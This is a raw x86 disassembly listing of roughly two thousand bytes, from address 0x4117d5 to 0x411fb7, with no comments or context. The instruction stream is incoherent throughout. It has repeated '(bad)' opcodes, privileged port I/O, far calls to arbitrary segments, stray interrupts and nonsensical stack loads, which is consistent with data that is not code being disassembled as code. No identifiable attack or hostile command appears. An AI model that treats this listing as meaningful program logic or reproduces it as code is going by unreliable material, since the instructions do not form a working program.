  4117d5:	shr    DWORD PTR [esp+eiz*4],1
  4117d8:	push   ss
  4117d9:	add    DWORD PTR [esi+0x2b],eax
  4117dc:	xor    bl,dh
  4117de:	mov    al,0x77
  4117e0:	je     0x411840
  4117e2:	jo     0x411812
  4117e4:	pop    ebp
  4117e5:	add    DWORD PTR ds:0x49bca813,edi
  4117eb:	outs   dx,BYTE PTR fs:[esi]
  4117ed:	jle    0x41182b
  4117ef:	inc    ecx
  4117f0:	add    ecx,DWORD PTR [esi]
  4117f2:	xor    dl,dh
  4117f4:	lock and eax,0x1fb1e12b
  4117fa:	in     eax,0xe1
  4117fc:	fnstcw WORD PTR [esi-0x48]
  4117ff:	(bad)  
  411802:	imul   ecx,DWORD PTR [ebx-0x5f],0x50e49222
  411809:	sub    ebx,ebx
  41180b:	or     DWORD PTR [edx+0x36],esi
  41180e:	stc    
  41180f:	dec    eax
  411810:	dec    ebp
  411811:	sbb    ah,bh
  411813:	addr16 daa 
  411815:	mov    cs,ecx
  411817:	sub    eax,0xd8b9b0df
  41181c:	int    0x23
  41181e:	xor    BYTE PTR [eax+ebx*1-0x79],0x6e
  411823:	inc    ebp
  411824:	pop    ebx
  411825:	fcomp  DWORD PTR [esi]
  411827:	add    esi,ecx
  411829:	mov    dl,0xd0
  41182b:	mov    ds:0x288ada28,eax
  411830:	aam    0x4f
  411832:	bswap  ecx
  411834:	cmp    DWORD PTR [bx+di+0x57],0xffffffc6
  411839:	cdq    
  41183a:	in     al,dx
  41183b:	rcr    DWORD PTR [ecx-0x54433bfb],cl
  411841:	add    al,BYTE PTR [ebx]
  411843:	repz (bad) 
  411845:	xchg   esi,eax
  411846:	in     eax,dx
  411847:	imul   eax,DWORD PTR [ebp+0x2d],0xdb4c56c2
  41184e:	js     0x41187f
  411850:	or     eax,0xed535bd3
  411855:	pop    esi
  411856:	retf   
  411857:	pop    ebp
  411858:	or     DWORD PTR [edi],0x3bf8c5a7
  41185e:	xchg   esi,eax
  41185f:	mov    dh,0x17
  411861:	rcl    DWORD PTR [ebx+0x35043f64],cl
  411867:	mov    dl,0xd8
  411869:	scas   eax,DWORD PTR es:[edi]
  41186a:	cld    
  41186b:	add    al,0x69
  41186d:	cmp    eax,0x4e4cade5
  411872:	and    cl,BYTE PTR [edx-0x41978eda]
  411878:	jno    0x41187d
  41187a:	stc    
  41187b:	and    cl,ch
  41187d:	xchg   BYTE PTR ds:0x51242698,dl
  411883:	and    al,0xef
  411885:	cli    
  411886:	add    edi,DWORD PTR ds:0xcef2c5dd
  41188c:	mov    al,ds:0x33ae9ecf
  411891:	xchg   ebx,eax
  411892:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411893:	out    0x7c,eax
  411895:	mov    ds:0xaaa8a288,eax
  41189a:	jbe    0x411900
  41189c:	addr16 dec ecx
  41189e:	mov    ds:0xf5bf52d,eax
  4118a3:	cld    
  4118a4:	(bad)  
  4118a5:	pop    ebx
  4118a6:	push   0x84563613
  4118ab:	push   ss
  4118ac:	mov    esp,0x82814daa
  4118b1:	sub    BYTE PTR [ebx],al
  4118b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118b4:	js     0x411879
  4118b6:	xchg   edi,eax
  4118b7:	addr16 inc ebp
  4118b9:	inc    ebx
  4118ba:	pop    edi
  4118bb:	shl    DWORD PTR [edx-0x62bd86d8],0xd1
  4118c2:	mov    esp,0x720dff58
  4118c7:	call   0x20abcc9
  4118cc:	call   0x3282:0x9e4fc1a1
  4118d3:	adc    al,dh
  4118d5:	(bad)  
  4118d6:	std    
  4118d7:	mov    ebx,0x389eae4e
  4118dc:	call   0xaaa5:0x75e20dc9
  4118e3:	int    0x96
  4118e5:	mov    ebx,0x5f3bb98b
  4118ea:	out    dx,eax
  4118eb:	or     edi,ecx
  4118ed:	mov    dh,0xc2
  4118ef:	jnp    0x411895
  4118f1:	sbb    dh,BYTE PTR [ebp-0xf]
  4118f4:	push   es
  4118f5:	jle    0xd3cb8222
  4118fb:	cmp    al,0x48
  4118fd:	xor    eax,edx
  4118ff:	pop    ebp
  411900:	sar    BYTE PTR [ecx-0x68],1
  411903:	xchg   ecx,eax
  411904:	xchg   esp,eax
  411905:	repnz fisttp QWORD PTR [ebp-0x4c]
  411909:	mov    dl,bl
  41190b:	out    dx,eax
  41190c:	push   edx
  41190d:	ret    
  41190e:	es out dx,al
  411910:	stc    
  411911:	jmp    0xbf99e856
  411916:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411917:	adc    eax,0x1b31c4f3
  41191c:	mov    al,ds:0x1a091d16
  411921:	call   0x60765585
  411926:	or     al,0xee
  411928:	and    DWORD PTR [edx-0x40],ebx
  41192b:	add    al,0x4b
  41192d:	hlt    
  41192e:	std    
  41192f:	xor    al,0xeb
  411931:	add    al,0xd
  411933:	jo     0x411936
  411935:	sub    al,0xe4
  411937:	lods   al,BYTE PTR ds:[esi]
  411938:	aaa    
  411939:	push   esp
  41193a:	inc    ebp
  41193b:	mov    ds:0xecb93753,eax
  411940:	aas    
  411941:	ins    DWORD PTR es:[edi],dx
  411942:	arpl   WORD PTR [edx+eax*1-0x93c6ce5],dx
  411949:	(bad)  
  41194a:	lods   al,BYTE PTR ds:[esi]
  41194b:	test   bh,bl
  41194d:	or     DWORD PTR ds:0x8df58e21,0x96a7967e
  411957:	inc    ecx
  411958:	dec    ebp
  411959:	xor    DWORD PTR [edi+0x30],esp
  41195c:	fwait
  41195d:	and    esi,DWORD PTR [esi+edi*1+0x6d]
  411961:	hlt    
  411962:	mov    dh,0x48
  411964:	sub    edi,DWORD PTR [esi-0xbeff919]
  41196a:	push   ds
  41196b:	xchg   edi,eax
  41196c:	and    eax,0x4f3d7a0e
  411971:	pop    es
  411972:	aas    
  411973:	sbb    al,0x80
  411975:	shl    BYTE PTR [esi+0x64f6fb0d],cl
  41197b:	push   esi
  41197c:	xchg   esp,eax
  41197d:	(bad)  
  41197f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411980:	stos   BYTE PTR es:[edi],al
  411981:	mov    eax,es:0x38b8477b
  411987:	in     eax,0xd5
  411989:	jle    0x411956
  41198b:	ficom  WORD PTR [eax+0xf917a12]
  411991:	data16 test al,cl
  411994:	std    
  411995:	add    DWORD PTR [ebx],esp
  411997:	cmc    
  411998:	jb     0x4119c0
  41199a:	fwait
  41199b:	cmp    bl,al
  41199d:	push   cs
  41199e:	push   edi
  41199f:	cwde   
  4119a0:	adc    DWORD PTR [edi],edi
  4119a2:	jp     0x4119f9
  4119a4:	mov    eax,0x6aacb5d3
  4119a9:	adc    bl,ch
  4119ab:	adc    ch,BYTE PTR [edx+0xcfc34b2]
  4119b1:	push   edi
  4119b2:	sahf   
  4119b3:	mov    ds:0x75716e3f,al
  4119b8:	xor    BYTE PTR [ebp-0x59],ch
  4119bb:	cld    
  4119bc:	scas   al,BYTE PTR es:[edi]
  4119bd:	mov    esi,0xfefce963
  4119c2:	int3   
  4119c3:	adc    eax,0xfa4cf222
  4119c8:	aam    0x1a
  4119ca:	(bad)  
  4119cb:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  4119cd:	pop    ss
  4119ce:	jae    0x41195a
  4119d0:	push   cs
  4119d1:	mov    ebx,0xb40fe8f3
  4119d6:	dec    edx
  4119d7:	call   0xdabeea2
  4119dc:	sbb    eax,0x3d0cc67
  4119e1:	cs dec esp
  4119e3:	gs adc eax,DWORD PTR ds:[ebx-0x60]
  4119e8:	inc    edx
  4119e9:	jl     0x41197b
  4119eb:	dec    ebx
  4119ec:	pop    eax
  4119ed:	lock xor edi,esp
  4119f0:	or     al,0xbc
  4119f2:	xchg   ebx,eax
  4119f3:	fldcw  WORD PTR [edx]
  4119f5:	mov    bh,BYTE PTR [ecx+0x62efbd91]
  4119fb:	test   al,0xc7
  4119fd:	aaa    
  4119fe:	xchg   ebx,eax
  4119ff:	scas   eax,DWORD PTR es:[edi]
  411a00:	loope  0x4119cb
  411a02:	pop    eax
  411a03:	jg     0x4119cf
  411a05:	inc    ebx
  411a06:	xor    BYTE PTR [ebx+0x13d3dd15],0x91
  411a0d:	adc    al,0xb2
  411a0f:	pop    edx
  411a10:	mov    ebx,DWORD PTR [ecx]
  411a12:	mov    ah,0x3b
  411a14:	pop    ebx
  411a15:	push   eax
  411a16:	inc    ebx
  411a17:	xchg   esp,eax
  411a18:	mov    ebp,0x8eb5435a
  411a1d:	sub    DWORD PTR [edi+edi*4],edx
  411a20:	adc    al,0x55
  411a22:	sahf   
  411a23:	push   esp
  411a24:	add    esi,DWORD PTR [ebx]
  411a26:	repz mov bh,0x7d
  411a29:	sete   bl
  411a2c:	or     eax,0xfbcc5691
  411a31:	shr    BYTE PTR [eax+0x62],cl
  411a34:	jg     0x4119d6
  411a36:	xor    al,0xdd
  411a38:	jne    0x411a2d
  411a3a:	les    esi,FWORD PTR [edx-0x1cd5fece]
  411a40:	mov    ds:0x6a625ed2,eax
  411a45:	and    ebx,DWORD PTR [ebx+0x6c6f1206]
  411a4b:	enter  0x7256,0xf9
  411a4f:	leave  
  411a50:	call   0xce41:0x5886a8b0
  411a57:	jno    0x4119ee
  411a59:	out    dx,al
  411a5a:	push   es
  411a5b:	mov    edx,0xc56b5e07
  411a60:	test   eax,0x189a243d
  411a66:	ds (bad) 
  411a69:	pop    edx
  411a6a:	out    dx,al
  411a6b:	jne    0x411a4d
  411a6d:	js     0x411acb
  411a6f:	pop    esp
  411a70:	clc    
  411a71:	or     eax,0x58bda3bb
  411a76:	lahf   
  411a77:	jl     0x411a48
  411a79:	jae    0x411aa5
  411a7b:	stos   BYTE PTR es:[edi],al
  411a7c:	mov    ch,0xb7
  411a7e:	and    DWORD PTR [ebp+0x1b],ebp
  411a81:	and    cl,BYTE PTR ds:0x3e0664e9
  411a87:	sar    BYTE PTR [edi+0x2c9a77a4],0x9b
  411a8e:	mov    ebp,0xc474d675
  411a93:	and    al,0xe4
  411a95:	aam    0xb2
  411a97:	in     al,0x8f
  411a99:	xor    eax,0x248e8d61
  411a9e:	gs cmp si,si
  411aa2:	shl    DWORD PTR [edi+0x40],cl
  411aa5:	jnp    0x411a81
  411aa7:	fcomi  st,st(0)
  411aa9:	sub    eax,0xb7bca429
  411aae:	cmc    
  411aaf:	jnp    0x411b10
  411ab1:	mov    BYTE PTR [esi],dh
  411ab3:	push   cs
  411ab4:	fidivr DWORD PTR [eax]
  411ab6:	int3   
  411ab7:	aad    0xc6
  411ab9:	push   ecx
  411aba:	push   ebp
  411abb:	mov    dh,BYTE PTR [esi-0xd]
  411abe:	xchg   edx,eax
  411abf:	adc    ebp,edi
  411ac1:	ss cmp ecx,edi
  411ac4:	and    eax,0x7dcac2ea
  411ac9:	adc    eax,0x1485384f
  411ace:	jo     0x411b07
  411ad0:	add    eax,0x3c571123
  411ad5:	cmp    BYTE PTR [ebp-0x7f],cl
  411ad8:	iret   
  411ad9:	pop    esi
  411ada:	ja     0x411aa3
  411adc:	cmp    ecx,DWORD PTR [esi+0xe]
  411adf:	scas   al,BYTE PTR es:[edi]
  411ae0:	or     DWORD PTR [edi+0x244dd5c2],0x78
  411ae7:	das    
  411ae8:	retf   
  411ae9:	fwait
  411aea:	jb     0x411b1f
  411aec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411aed:	push   cs
  411aee:	jns    0x411b3c
  411af0:	sbb    al,0xe6
  411af2:	iret   
  411af3:	pop    es
  411af4:	addr16 mov esi,0xd211c808
  411afa:	push   0xb75cd1c7
  411aff:	je     0x411ab1
  411b01:	inc    ebx
  411b02:	je     0x411ae0
  411b04:	dec    esp
  411b05:	div    DWORD PTR [esi+0x2b]
  411b08:	mov    ebx,0xaaa3a287
  411b0d:	cld    
  411b0e:	push   ebx
  411b0f:	inc    edx
  411b10:	mov    eax,0xec65f160
  411b15:	dec    esi
  411b16:	push   es
  411b17:	repz mov ds:0x58c6f9ec,eax
  411b1d:	aad    0xc
  411b1f:	inc    esp
  411b20:	and    edi,DWORD PTR [esi+0x1b]
  411b23:	ret    
  411b24:	add    eax,0x471dc611
  411b29:	add    bl,BYTE PTR [edi+0x588e0630]
  411b2f:	and    DWORD PTR [edx-0x24864eaf],0x61
  411b36:	aam    0x37
  411b38:	idiv   esi
  411b3a:	popa   
  411b3b:	in     al,0xc7
  411b3d:	jne    0x411ba0
  411b3f:	out    dx,al
  411b40:	sub    DWORD PTR [eax],0xffffff93
  411b43:	mov    dh,0x9a
  411b45:	aaa    
  411b46:	sbb    eax,0x566c4854
  411b4b:	shr    BYTE PTR [esi-0x7a4f3739],0x1f
  411b52:	fcomip st,st(5)
  411b54:	in     eax,dx
  411b55:	jp     0x411b2e
  411b57:	(bad)  
  411b59:	in     al,0x2f
  411b5b:	jne    0x411b19
  411b5d:	add    eax,0x1626dfa8
  411b62:	sar    DWORD PTR [ecx],0x2c
  411b65:	popf   
  411b66:	sub    ebp,esp
  411b68:	push   cs
  411b69:	xor    cl,BYTE PTR [esi-0x1b99ffd3]
  411b6f:	mov    cl,0x9c
  411b71:	mov    ebx,0x239d534f
  411b76:	sub    al,0x1d
  411b78:	mov    bl,0xcd
  411b7a:	xchg   esi,eax
  411b7b:	pop    ebx
  411b7c:	and    dl,al
  411b7e:	pop    es
  411b7f:	mov    edx,0xc56a7142
  411b84:	pop    edx
  411b85:	rcr    esp,0x1
  411b88:	mov    ds:0x41c35c8e,al
  411b8d:	mov    esi,0x5311398c
  411b92:	pop    ebp
  411b93:	adc    eax,0xda179915
  411b98:	add    ebx,edx
  411b9a:	cmp    DWORD PTR [ebx],ecx
  411b9c:	jg     0x411b57
  411b9e:	add    ebx,ebx
  411ba0:	ret    0x9cb1
  411ba3:	pop    ecx
  411ba4:	pop    ds
  411ba5:	xchg   ebx,eax
  411ba6:	movsx  edi,cl
  411ba9:	mov    al,ds:0x5e3a1252
  411bae:	xor    BYTE PTR [edi+edx*1-0x31],al
  411bb2:	sbb    esi,ebx
  411bb4:	push   0x3a
  411bb6:	add    eax,0xefd10a8c
  411bbb:	sub    bh,BYTE PTR [ebx+ebx*4]
  411bbe:	mov    bl,0x5b
  411bc0:	in     eax,dx
  411bc1:	test   eax,0x83646195
  411bc6:	imul   edx,DWORD PTR [ecx-0x182602fa],0xb716aff6
  411bd0:	cmp    al,0xc8
  411bd2:	or     cl,cl
  411bd4:	jae    0x411b6d
  411bd6:	pop    esi
  411bd7:	enter  0x729a,0x7f
  411bdb:	adc    al,0xe0
  411bdd:	or     eax,0xe45d52ae
  411be2:	mov    cl,0x8f
  411be4:	out    0xc,eax
  411be6:	pushf  
  411be7:	in     al,0x8a
  411be9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411bea:	stos   BYTE PTR es:[edi],al
  411beb:	cdq    
  411bec:	mov    dh,0xe1
  411bee:	xchg   DWORD PTR [edi-0x46],edi
  411bf1:	and    al,0xa8
  411bf3:	sbb    eax,0xf0a5772a
  411bf8:	sub    eax,0x8c6c1a69
  411bfd:	mov    WORD PTR [ebx+eax*8+0x54],fs
  411c01:	std    
  411c02:	cli    
  411c03:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c05:	jnp    0x411c0b
  411c07:	cvttps2pi mm5,QWORD PTR [esi-0x3]
  411c0b:	push   esi
  411c0c:	(bad)  
  411c0d:	xor    al,0xd0
  411c0f:	mov    cs,esi
  411c11:	in     al,0x51
  411c13:	jno    0x411c8a
  411c15:	pop    edx
  411c16:	mov    dl,0x44
  411c18:	dec    ecx
  411c19:	inc    esp
  411c1a:	sbb    al,bh
  411c1c:	inc    eax
  411c1d:	cmp    BYTE PTR [ebp-0x4dd23d2b],dl
  411c23:	push   eax
  411c24:	je     0x411c07
  411c26:	sub    DWORD PTR [edx],edx
  411c28:	xchg   ebp,eax
  411c29:	fwait
  411c2a:	retf   0x607f
  411c2d:	inc    esi
  411c2e:	imul   ebx,eax,0x640ecacc
  411c34:	fidivr DWORD PTR [edx+0x76]
  411c37:	ins    BYTE PTR es:[edi],dx
  411c38:	xor    al,0xe
  411c3a:	push   edi
  411c3b:	gs clc 
  411c3d:	retf   
  411c3e:	nop
  411c3f:	and    dl,BYTE PTR [ebp+0x48]
  411c42:	data16 add ah,ch
  411c45:	ins    DWORD PTR es:[edi],dx
  411c46:	cmp    esi,DWORD PTR [edi+0x6a7a5b51]
  411c4c:	aaa    
  411c4d:	jmp    0x32a6:0x29ee3b96
  411c54:	jle    0x411cc9
  411c56:	and    ch,BYTE PTR [esi+0x3b3a6dcb]
  411c5c:	and    dl,BYTE PTR [esi]
  411c5e:	fstp   st(7)
  411c60:	pop    ebx
  411c61:	retf   
  411c62:	js     0x411c3e
  411c64:	out    dx,al
  411c65:	jmp    0xe581dc10
  411c6a:	outs   dx,BYTE PTR ds:[esi]
  411c6b:	push   es
  411c6c:	sub    eax,0x44e31bdb
  411c71:	les    edx,FWORD PTR [edi+esi*4-0x7aee4f5e]
  411c78:	add    cl,BYTE PTR [edx+0x38]
  411c7b:	cmp    BYTE PTR [eax],al
  411c7d:	cmp    eax,0x53f8d711
  411c82:	call   0xdf42:0xa85be093
  411c89:	stc    
  411c8a:	xchg   ebx,eax
  411c8b:	xor    esp,DWORD PTR [ebp-0x6559ff09]
  411c91:	push   cs
  411c92:	test   bl,dl
  411c94:	ret    0x941d
  411c97:	adc    al,0x53
  411c99:	mov    ecx,esp
  411c9b:	xlat   BYTE PTR ds:[ebx]
  411c9c:	outs   dx,DWORD PTR ds:[esi]
  411c9d:	and    ch,bh
  411c9f:	hlt    
  411ca0:	clc    
  411ca1:	in     al,dx
  411ca2:	xor    cl,ah
  411ca4:	mov    esi,0x3e628aca
  411ca9:	xchg   ebp,eax
  411caa:	mov    bh,0x1d
  411cac:	ud1    ebp,DWORD PTR [eax]
  411caf:	mov    ebp,0xfa338250
  411cb4:	mov    ax,0x82af
  411cb8:	jg     0x411d35
  411cba:	sub    al,0x52
  411cbc:	xchg   ecx,eax
  411cbd:	fcomp  st(1)
  411cbf:	mov    dl,0xcf
  411cc1:	or     BYTE PTR [esi-0x17],0x42
  411cc5:	imul   esp,DWORD PTR [eax],0x7f
  411cc8:	arpl   WORD PTR [ebx+ecx*4-0x2f],bx
  411ccc:	mov    al,ds:0xa49a94f1
  411cd1:	ds jb  0x411d4d
  411cd4:	sbb    al,dl
  411cd6:	mov    ch,0x3a
  411cd8:	stc    
  411cd9:	adc    BYTE PTR [ecx],dl
  411cdb:	ins    DWORD PTR es:[edi],dx
  411cdc:	ror    DWORD PTR [edx+0x58172d79],cl
  411ce2:	xor    DWORD PTR [ecx-0x4d],esi
  411ce5:	mov    ebp,DWORD PTR [esi]
  411ce7:	(bad)  
  411ce8:	jne    0x411c6e
  411cea:	(bad)  
  411ceb:	outs   dx,BYTE PTR ds:[esi]
  411cec:	int    0xe5
  411cee:	sti    
  411cef:	aaa    
  411cf0:	add    DWORD PTR [ebx-0x4e],eax
  411cf3:	dec    esi
  411cf4:	pop    ds
  411cf5:	cdq    
  411cf6:	push   ss
  411cf7:	inc    esi
  411cf8:	push   esi
  411cf9:	jns    0x411d4d
  411cfb:	ss mov eax,0xd1946a9c
  411d01:	or     dl,BYTE PTR [edx-0x7b]
  411d04:	add    eax,0xc7f9153d
  411d09:	cmp    eax,0xa90ae71e
  411d0e:	and    DWORD PTR [ebx+0x670c90d1],eax
  411d14:	dec    esi
  411d15:	ret    0xd3f0
  411d18:	scas   al,BYTE PTR es:[edi]
  411d19:	sar    BYTE PTR [esi-0x1d],1
  411d1c:	pop    esp
  411d1d:	jecxz  0x411cf8
  411d1f:	mov    eax,0xad5ec60b
  411d24:	inc    esi
  411d25:	adc    ebp,DWORD PTR [eax-0x5cbd08af]
  411d2b:	xor    eax,0x7ea80a43
  411d30:	call   0x972ac492
  411d35:	add    DWORD PTR [ebx+0x47],ecx
  411d38:	repnz pushf 
  411d3a:	mov    edx,0x77f9a193
  411d3f:	mov    bh,ch
  411d41:	je     0x411d92
  411d43:	or     DWORD PTR [esi+edi*1-0x1d822f5d],ebx
  411d4a:	cmp    BYTE PTR [eax+0x75],ch
  411d4d:	adc    DWORD PTR [ebp+0x60],0x371c9da6
  411d54:	call   0x652d6bb0
  411d59:	mov    ds:0x9c543572,al
  411d5e:	(bad)  
  411d5f:	jg     0x411dde
  411d61:	xor    al,0xf3
  411d63:	aas    
  411d64:	hlt    
  411d65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d66:	mov    dl,0xe3
  411d68:	dec    ebx
  411d69:	(bad)  
  411d6b:	push   edi
  411d6c:	shr    BYTE PTR [ecx-0x7a],cl
  411d6f:	sbb    bh,BYTE PTR [ecx+0x2d]
  411d72:	and    BYTE PTR [edi+0x1b],dh
  411d75:	cwde   
  411d76:	stos   BYTE PTR es:[edi],al
  411d77:	add    edi,ebp
  411d79:	jecxz  0x411d6f
  411d7b:	sub    ch,BYTE PTR [edx-0x624869ad]
  411d81:	pop    ecx
  411d82:	scas   eax,DWORD PTR es:[edi]
  411d83:	pushf  
  411d84:	cmp    al,0x71
  411d86:	adc    ebx,ebp
  411d88:	pop    edx
  411d89:	inc    ebp
  411d8a:	mov    bl,0xa1
  411d8c:	dec    edi
  411d8d:	add    ebp,0x61
  411d90:	nop    DWORD PTR [ecx-0x77fb91fa]
  411d97:	or     eax,0x680b525
  411d9c:	aam    0x45
  411d9e:	fldenv [esp+eiz*4+0x60024f6f]
  411da5:	pop    eax
  411da6:	push   ss
  411da7:	es mov ch,0xb
  411daa:	mov    ch,0x1d
  411dac:	or     DWORD PTR [ebp-0x1c4e2998],ebx
  411db2:	add    eax,0xe46f1d77
  411db7:	mov    ds:0x1c74b5be,eax
  411dbc:	sub    DWORD PTR [ebx-0x416381e3],ebx
  411dc2:	mov    bl,0x7e
  411dc4:	xchg   esp,eax
  411dc5:	xor    al,0xec
  411dc7:	push   ebp
  411dc8:	cmp    al,0x48
  411dca:	cmp    ah,BYTE PTR [ebp-0x17]
  411dcd:	std    
  411dce:	dec    edx
  411dcf:	pop    ss
  411dd0:	out    0xb7,al
  411dd2:	push   es
  411dd3:	loope  0x411d63
  411dd5:	mov    dl,0xa0
  411dd7:	pushf  
  411dd8:	xor    esi,ecx
  411dda:	stos   DWORD PTR es:[edi],eax
  411ddb:	ret    
  411ddc:	test   eax,0xb7bfb3ab
  411de1:	inc    eax
  411de2:	popf   
  411de3:	add    DWORD PTR [edx-0x1407ba5f],edx
  411de9:	mov    dl,0xb7
  411deb:	push   ds
  411dec:	push   ebp
  411ded:	cmp    al,0x69
  411def:	lea    esi,[ecx+edi*4]
  411df2:	xor    cl,BYTE PTR [edi-0x14]
  411df5:	shl    DWORD PTR [ebp-0x6dfb594a],0x3d
  411dfc:	dec    ebp
  411dfd:	sbb    al,0xca
  411dff:	mov    ah,0x9f
  411e01:	pop    edx
  411e02:	es mov eax,0x131b737e
  411e08:	mov    ch,0x73
  411e0a:	retf   
  411e0b:	out    dx,al
  411e0c:	cmp    eax,0x2d5b8821
  411e11:	push   ecx
  411e12:	pop    ecx
  411e13:	dec    edx
  411e14:	pop    es
  411e15:	sbb    al,0x6f
  411e17:	mov    ecx,0xa4fb8927
  411e1c:	js     0x411e8e
  411e1e:	fs mov al,0x88
  411e21:	adc    eax,0xe5c28b9d
  411e26:	cmp    bl,BYTE PTR [edi]
  411e28:	fisttp WORD PTR [ebx+ebx*1]
  411e2b:	add    eax,0xf041d53d
  411e30:	push   cs
  411e31:	fcmovnu st,st(7)
  411e33:	mov    ds:0x4c2823c5,al
  411e38:	ds leave 
  411e3a:	or     bl,cl
  411e3c:	cdq    
  411e3d:	mov    ecx,0xb7d3ead7
  411e42:	jmp    0x9423:0xc1041591
  411e49:	push   ebx
  411e4a:	aam    0x92
  411e4c:	dec    ebp
  411e4d:	sti    
  411e4e:	ds xor eax,0xb792b6f9
  411e54:	and    esp,DWORD PTR [ecx+0x18]
  411e57:	clc    
  411e58:	and    cl,dl
  411e5a:	adc    ah,BYTE PTR [ecx]
  411e5c:	dec    edx
  411e5d:	inc    edi
  411e5e:	leave  
  411e5f:	lock push ebx
  411e61:	jge    0x411e2b
  411e63:	mov    ebp,0x97ca556
  411e68:	mov    eax,0x8d128f44
  411e6d:	sub    BYTE PTR ds:0x54b73e2b,dh
  411e73:	and    ah,BYTE PTR [eax-0x7d]
  411e76:	loope  0x411e8b
  411e78:	add    ebx,edx
  411e7a:	mov    DWORD PTR [ecx+0xe],edx
  411e7d:	mov    ah,0xf2
  411e7f:	mov    esi,0xaa9b570d
  411e84:	sub    ebp,ebx
  411e86:	(bad)  
  411e88:	jns    0x411e15
  411e8a:	add    bl,BYTE PTR [ecx]
  411e8c:	sub    bh,BYTE PTR [edx]
  411e8e:	xchg   esp,eax
  411e8f:	mov    ch,BYTE PTR [edx-0x3aec4ed]
  411e95:	xor    ecx,DWORD PTR ds:0xa4c35b69
  411e9b:	bound  esi,QWORD PTR [ebp+0x59]
  411e9e:	int3   
  411e9f:	mov    ecx,0x3e9d5d1c
  411ea4:	test   DWORD PTR [esi-0x3b],0xc14ad9b0
  411eab:	cmc    
  411eac:	fist   DWORD PTR [ecx]
  411eae:	mov    bl,0x2e
  411eb0:	inc    ebx
  411eb1:	adc    ebp,DWORD PTR [edx]
  411eb3:	popf   
  411eb4:	sub    BYTE PTR [edx+ebp*1+0x5b],ch
  411eb8:	sbb    edx,ebx
  411eba:	cmp    DWORD PTR [ecx],esi
  411ebc:	daa    
  411ebd:	mov    edi,0x9d18aeb6
  411ec2:	sbb    BYTE PTR [eax],bh
  411ec4:	pminsw mm4,mm3
  411ec7:	shr    DWORD PTR [edi],0x9e
  411eca:	jae    0x411ed4
  411ecc:	fist   DWORD PTR [ebp+0x35]
  411ecf:	(bad)
  411ed2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ed3:	int    0x86
  411ed5:	add    BYTE PTR [esp+edi*8-0x7c],0x27
  411eda:	mov    dl,0x45
  411edc:	or     eax,0xe43cc310
  411ee1:	mov    dh,0x6e
  411ee3:	inc    eax
  411ee4:	mul    DWORD PTR [ebx]
  411ee6:	shl    DWORD PTR [edx-0x53],1
  411ee9:	lea    edi,[ebx]
  411eeb:	ficom  WORD PTR [eax-0x6b]
  411eee:	adc    cl,dh
  411ef0:	and    DWORD PTR [esi+0x1ee7bc27],esi
  411ef6:	into   
  411ef7:	and    BYTE PTR [edi-0x66be19e4],al
  411efd:	dec    esp
  411efe:	push   ebx
  411eff:	push   ss
  411f00:	xor    edi,DWORD PTR [eax]
  411f02:	retf   0x3bf2
  411f05:	push   ds
  411f06:	add    al,0x95
  411f08:	je     0x411eed
  411f0a:	xor    ebx,0xd
  411f0d:	mov    ah,BYTE PTR [esi-0x4d]
  411f10:	lods   eax,DWORD PTR ds:[si]
  411f12:	shl    DWORD PTR ds:0x7551c8cc,0x0
  411f19:	mov    eax,DWORD PTR [edx+0x49]
  411f1c:	inc    ecx
  411f1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f1e:	ins    DWORD PTR es:[edi],dx
  411f1f:	xchg   BYTE PTR [esi+0x327339c6],dl
  411f25:	(bad)  
  411f26:	ror    DWORD PTR [esi],1
  411f28:	hlt    
  411f29:	xor    ah,BYTE PTR [ecx]
  411f2b:	dec    BYTE PTR [eax+0x4bd1158a]
  411f31:	arpl   WORD PTR [ecx],sp
  411f33:	and    eax,0x6f75cf81
  411f38:	fild   DWORD PTR [esi]
  411f3a:	jp     0x411fb0
  411f3c:	xchg   ebx,eax
  411f3d:	sub    BYTE PTR [ebx+eiz*1+0xf],ch
  411f41:	test   DWORD PTR [esi+0x43],eax
  411f44:	jg     0x411fad
  411f46:	xor    al,0x2f
  411f48:	mov    cl,0xe1
  411f4a:	mov    ebx,edx
  411f4c:	cmp    BYTE PTR [edi],ch
  411f4e:	daa    
  411f4f:	outs   dx,DWORD PTR ds:[esi]
  411f50:	jecxz  0x411fad
  411f52:	push   esi
  411f53:	and    DWORD PTR gs:[ebp-0x37242168],edx
  411f5a:	lock xchg edi,eax
  411f5c:	fisubr DWORD PTR [ebx-0x66f04c0d]
  411f62:	scas   eax,DWORD PTR es:[edi]
  411f63:	stc    
  411f64:	add    DWORD PTR [ecx],ebx
  411f66:	js     0x411f92
  411f68:	add    dh,BYTE PTR [ebx+0xb]
  411f6b:	jbe    0x411f32
  411f6d:	fsub   st,st(2)
  411f6f:	ret    0x5837
  411f72:	mov    dh,0xca
  411f74:	jno    0x411fd7
  411f76:	std    
  411f77:	or     al,BYTE PTR [esi+ebp*2-0x1e]
  411f7b:	mov    esi,0x3571523c
  411f80:	mov    ds:0x44f0cbfb,eax
  411f85:	fadd   DWORD PTR [ecx]
  411f87:	(bad)  
  411f88:	mov    eax,0x13874d57
  411f8d:	inc    eax
  411f8e:	mov    ds:0x6ade32d3,al
  411f93:	fist   WORD PTR [edx]
  411f95:	int3   
  411f96:	popa   
  411f97:	lods   eax,DWORD PTR ds:[esi]
  411f98:	stos   DWORD PTR es:[edi],eax
  411f99:	or     cl,BYTE PTR [esi-0x60]
  411f9c:	sub    DWORD PTR [ebx+0x4f6a395],ecx
  411fa2:	push   ecx
  411fa3:	dec    esi
  411fa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411fa5:	ret    
  411fa6:	sub    dl,BYTE PTR [edx-0x3a]
  411fa9:	xchg   ebp,eax
  411faa:	aam    0x30
  411fac:	jne    0x411fcb
  411fae:	jb     0x411fb9
  411fb0:	pop    esp
  411fb1:	jnp    0x411fa9
  411fb3:	outs   dx,BYTE PTR ds:[esi]
  411fb4:	(bad)  
  411fb5:	fs daa 
  411fb7:	add    al,0x2
